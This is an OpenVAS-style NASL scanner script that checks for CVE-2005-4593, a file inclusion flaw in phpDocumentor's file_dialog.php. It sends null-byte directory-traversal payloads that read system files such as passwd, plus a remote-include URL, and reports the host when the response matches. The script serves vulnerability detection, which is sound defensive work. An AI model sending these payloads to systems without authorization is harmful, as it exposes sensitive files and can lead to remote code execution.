if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.20374" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2005-4593" );
	script_bugtraq_id( 16080 );
	script_xref( name: "OSVDB", value: "22114" );
	script_xref( name: "OSVDB", value: "22115" );
	script_name( "phpDocumentor <= 1.3.0 RC4 Local And Remote File Inclusion Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2006 Ferdy Riphagen" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://retrogod.altervista.org/phpdocumentor_130rc4_incl_expl.html" );
	script_xref( name: "URL", value: "https://marc.info/?l=bugtraq&m=113587730223824&w=2" );
	script_tag( name: "solution", value: "Disable PHP's 'register_globals' setting." );
	script_tag( name: "summary", value: "The remote host appears to be running the web-interface of
  phpDocumentor. This version does not properly sanitize user input in the 'file_dialog.php'
  file and a test file called 'bug-559668.php'" );
	script_tag( name: "impact", value: "It is possible for an attacker to include remote files and
  execute arbitrary commands on the remote system, and display the content of sensitive files.

  This flaw is exploitable if PHP's 'register_globals' setting is enabled." );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "qod_type", value: "remote_active" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/phpdocumentor", "/phpdoc", "/PhpDocumentor", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: NASLString( dir, "/docbuilder/top.php" ), port: port );
	if(!res){
		continue;
	}
	if(egrep( pattern: "docBuilder.*phpDocumentor v[0-9.]+.*Web Interface", string: res )){
		n = 0;
		for pattern in keys( files ) {
			file = files[pattern];
			exploit[n] = "../../../../../../../" + file + "%00";
			result[n] = pattern;
			error[n] = "Warning.*main.*/" + file + ".*failed to open stream";
			n++;
		}
		exploit[n] = NASLString( "http://", get_host_name(), "/robots.txt%00" );
		result[n] = "root:.*:0:[01]:.*:|User-agent:";
		error[n] = "Warning.*/robots.txt.*failed to open stream";
		for(exp = 0;exploit[exp];exp++){
			url = NASLString( dir, "/docbuilder/file_dialog.php?root_dir=", exploit[exp] );
			req = http_get( item: url, port: port );
			recv = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
			if(!recv){
				continue;
			}
			if(egrep( pattern: result[exp], string: recv ) || egrep( pattern: error[exp], string: recv )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( data: report, port: port );
				exit( 0 );
			}
		}
	}
}
exit( 0 );

